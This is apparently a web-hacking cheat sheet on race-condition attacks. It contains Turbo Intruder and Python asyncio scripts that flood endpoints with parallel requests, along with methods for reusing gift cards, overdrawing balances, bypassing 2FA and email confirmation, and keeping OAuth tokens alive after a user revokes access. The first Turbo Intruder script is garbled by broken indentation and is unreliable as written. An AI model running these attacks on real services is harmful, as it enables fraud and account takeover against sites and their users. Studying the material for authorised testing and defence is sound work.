# Race Condition
Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language.

## Turbo Intruder - Examples 1
1. Send request to turbo intruder
2. Use this python code as a payload of the turbo intruder
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                        concurrentConnections=30,
                        requestsPerConnection=30,
                        pipeline=False
                        )

for i in range(30):
    engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')


    engine.start(timeout=5)
engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)

```
3. Now set the external HTTP header x-request: %s - ⚠️ This is needed by the turbo intruder
4. Click "Attack"

## Turbo Intruder 2 Requests - Examples 2
This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds.
```python
def queueRequests(target, wordlists): 
    engine = RequestEngine(endpoint=target.endpoint, 
                           concurrentConnections=30, 
                           requestsPerConnection=100, 
                           pipeline=False 
                           ) 
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    ''' 

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30): 
        engine.queue(request2, gate='race1') 
    engine.openGate('race1') 
    engine.complete(timeout=60) 
def handleResponse(req, interesting): 
    table.add(req)

```
## Turbo Intruder - HTTP2 single-packet attack (Several endpoints)
In case you need to send a request to 1 endpoint and then multiple to other endpoints to trigger the RCE, you can change the race-single-packet-attack.py script with something like:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # Hardcode the second request for the RC
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''
    
    # For each attempt (20 in total) send 50 confirmation requests.
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'aUser' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

```
## Send group in parallel (Manual Testing)
It's also available in Repeater via the new 'Send group in parallel' option in Burp Suite.

* For limit-overrun you could just add the same request 50 times in the group.
* For connection warming, you could add at the beginning of the group some requests to some non static part of the web server.
* For delaying the process between processing one request and another in a 2 substates steps, you could add extra requests between both requests.
* For a multi-endpoint RC you could start sending the request that goes to the hidden state and then 50 requests just after it that exploits the hidden state.

  
![spaces_-L_2uGJGU7AVNRcqRvEi_uploads_fo1FdvsJdJLBtaUzNMTS_image](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/c89ba370-bd3d-437d-8a17-2ffe7feb6ed5)


## Raw BF
Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.

* **Repeater:** Check the examples from the previous section.
* **Intruder:** Send the request to Intruder, set the number of threads to 30 inside the Options menu and, select as payload Null payloads and generate 30.
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
    for i in range(len(a)):
        engine.queue(target.req,a[i], gate='race1')
    # open TCP connections and send partial requests
    engine.start(timeout=10)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)

```

**Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
    resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
    return resp.text

async def main():
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(20): #20 times
            tasks.append(asyncio.ensure_future(use_code(client)))
        
        # Get responses
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Print results
        for r in results:
            print(r)
        
        # Async2sync sleep
        await asyncio.sleep(0.5)
    print(results)

asyncio.run(main())

```

## RC Methodology
### Limit-overrun / TOCTOU
This is the most basic type of race condition where vulnerabilities that appear in places that limit the number of times you can perform an action. Like using the same discount code in a web store several times. A very easy example can be found in [this report](https://pravinponnusamy.medium.com/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) or in [this bug](https://hackerone.com/reports/759247).

There are many variations of this kind of attack, including:
* Redeeming a gift card multiple times
* Rating a product multiple times
* Withdrawing or transferring cash in excess of your account balance
* Reusing a single CAPTCHA solution
* Bypassing an anti-brute-force rate limit

### Hidden substates
Other most complicated RC will exploit substates in the machine state that could allow an attacker to abuse states he was never meant to have access to but there is a small window for the attacker to access it.

1. **Predict potential hidden & interesting substates**

The first step is to identify all the endpoints that either write to it, or read data from it and then use that data for something important. For example, users might be stored in a database table that is modified by registration, profile-edits, password reset initiation, and password reset completion.

We can use three key questions to rule out endpoints that are unlikely to cause collisions. For each object and the associated endpoints, ask:

* How is the state stored?
Data that's stored in a persistent server-side data structure is ideal for exploitation. Some endpoints store their state entirely client-side, such as password resets that work by emailing a JWT - these can be safely skipped.

Applications will often store some state in the user session. These are often somewhat protected against sub-states - more on that later.


* Are we editing or appending?
Operations that edit existing data (such as changing an account's primary email address) have ample collision potential, whereas actions that simply append to existing data (such as adding an additional email address) are unlikely to be vulnerable to anything other than limit-overrun attacks.


* What's the operation keyed on?
Most endpoints operate on a specific record, which is looked up using a 'key', such as a username, password reset token, or filename. For a successful attack, we need two operations that use the same key. For example, picture two plausible password reset implementations:

![image](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/de0ea26b-c6ef-44c6-85cb-d43ab3813777)

2. **Probe for clues**

At this point it's time to launch some RCs attacks over the potential interesting endpoints to try to find unexpected results compare to the regular ones. Any deviation from the expected response such as a change in one or more responses, or a second-order effect like different email contents or a visible change in your session could be a clue indicating something is wrong.

3. **Prove the concept**

The final step is to prove the concept and turn it into a viable attack.

When you send a batch of requests, you may find that an early request pair triggers a vulnerable end-state, but later requests overwrite/invalidate it and the final state is unexploitable. In this scenario, you'll want to eliminate all unnecessary requests - two should be sufficient for exploiting most vulnerabilities. However, dropping to two requests will make the attack more timing-sensitive, so you may need to retry the attack multiple times or automate it.


### Time Sensitive Attacks
Sometimes you may not find race conditions, but the techniques for delivering requests with precise timing can still reveal the presence of other vulnerabilities.

One such example is when high-resolution timestamps are used instead of cryptographically secure random strings to generate security tokens.

Consider a password reset token that is only randomized using a timestamp. In this case, it might be possible to trigger two password resets for two different users, which both use the same token. All you need to do is time the requests so that they generate the same timestamp.



> ⚠️ NOTE
> 
> To confirm for example the previous situation you could just ask for 2 reset password tokens at the same time (using single packet attack) and check if they are the same.


## Hidden substates case studies
### Confirm other emails
The idea is to verify an email address and change it to a different one at the same time to find out if the platform verifies the new one changed.
### Change email to 2 emails addresses Cookie based
According to [this writeup](https://portswigger.net/research/smashing-the-state-machine) Gitlab was vulnerable to a takeover this way because it might send the email verification token of one email to the other email.

### Hidden Database states / Confirmation Bypass
If 2 different writes are used to add information inside a database, there is a small portion of time where only the first data has been written inside the database. For example, when creating a user the username and password might be written and then the token to confirm the newly created account is written. This means that for a small time the token to confirm an account is null.

Therefore registering an account and sending several requests with an empty token (token= or token[]= or any other variation) to confirm the account right away could allow to confirm an account where you don't control the email.

### Bypass 2FA
The following pseudo-code demonstrates how a website could be vulnerable to a race variation of this attack:
```python
session['userid'] = user.userid
if user.mfa_enabled:
    session['enforce_mfa'] = True
    # generate and send MFA code to user
    # redirect browser to MFA code entry form

```
As you can see, this is in fact a multi-step sequence within the span of a single request. Most importantly, it transitions through a sub-state in which the user temporarily has a valid logged-in session, but MFA isn't yet being enforced. An attacker could potentially exploit this by sending a login request along with a request to a sensitive, authenticated endpoint.

### OAuth2 eternal persistence

There are several [OAuth provider](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Theses services will allow you to create an application and authenticate users that the provider has registered. In order to do so, the client will need to permit your application to access some of their data inside of the OAUth provider.
So, until here just a common login with google/linkdin/github... where you are prompted with a page saying: "Application <InsertCoolName> wants to access you information, do you want to allow it?"

* **Race Condition in authorization_code**

The problem appears when you accept it and automatically sends an authorization_code to the malicious application. Then, this application abuses a Race Condition in the OAUth service provider to generate more that one AT/RT (Authentication Token/Refresh Token) from the authorization_code for your account. Basically, it will abuse the fact that you have accept the application to access your data to create several accounts. Then, if you stop allowing the application to access your data one pair of AT/RT will be deleted, but the other ones will still be valid.

* **Race Condition in Refresh Token**

Once you have obtained a valid RT you could try to abuse it to generate several AT/RT and even if the user cancels the permissions for the malicious application to access his data, several RTs will still be valid.












## Tools
* Turbo Intruder (Burp Suite extension)




